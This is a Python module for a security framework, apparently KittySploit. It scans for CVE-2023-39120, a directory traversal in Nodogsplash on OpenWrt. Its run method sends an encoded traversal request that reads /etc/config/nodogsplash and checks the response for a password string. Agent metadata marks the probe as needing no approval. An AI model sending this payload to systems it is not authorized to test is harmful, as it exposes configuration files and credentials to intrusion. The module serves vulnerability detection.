#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Nodogsplash product was affected by a directory traversal vulnerability that also impacted the OpenWrt product."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Nodogsplash - Directory Traversal Detection',
        'description': 'Nodogsplash product was affected by a directory traversal vulnerability that also impacted the OpenWrt product. This vulnerability was addressed in Nodogsplash version 5.0.1. Exploiting this vulnerability, remote attackers could read arbitrary files from the target system.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'lfi', 'openwrt', 'nodogsplash', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2023-39120',
            'https://github.com/nodogsplash/nodogsplash/commit/a745a5d635925d2a6f0e0530bdc0eac645b672ed',
            'https://gist.github.com/numanturle/55cb758bacc4930a081e79c2a6a769b6',
            'https://github.com/openwrt/routing/pull/997',
        ],
        'cve': 'CVE-2023-39120',
    }

    def run(self):
        r = self.http_request(method="GET", path='/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/config/nodogsplash', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('nodogsplash', 'password',)
        header_any = ('application/octet-stream',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='high',
                reason="Nodogsplash - Directory Traversal detected",
                path='/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/config/nodogsplash',
            )
            return True
        return False

